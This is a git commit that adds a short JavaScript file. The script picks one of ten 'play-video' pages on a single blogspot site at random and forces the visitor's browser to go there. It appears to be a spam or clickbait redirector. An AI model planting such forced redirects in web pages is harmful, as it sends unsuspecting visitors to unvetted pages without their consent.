c671ef5d003895b9b1957886edc713940cca31a3
idhoiphiy <idhoiphiy.o@gmail.com>
2026-08-18 14:13:29 +0700

    Create blogreucsharr1.js

---
+++ blogreucsharr1.js
@@ -0,0 +1,16 @@
+var dataUrl = [
+
+'https://newwtopplayvideoo.blogspot.com/2026/08/play-video-10.html',
+'https://newwtopplayvideoo.blogspot.com/2026/08/play-video-9.html',
+'https://newwtopplayvideoo.blogspot.com/2026/08/play-video-8.html',
+'https://newwtopplayvideoo.blogspot.com/2026/08/play-video-7.html',
+'https://newwtopplayvideoo.blogspot.com/2026/08/play-video-6.html',
+'https://newwtopplayvideoo.blogspot.com/2026/08/play-video-5.html',
+'https://newwtopplayvideoo.blogspot.com/2026/08/play-video-4.html',
+'https://newwtopplayvideoo.blogspot.com/2026/08/play-video-3.html',
+'https://newwtopplayvideoo.blogspot.com/2026/08/play-video-2.html',
+'https://newwtopplayvideoo.blogspot.com/2026/08/play-video-1.html'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
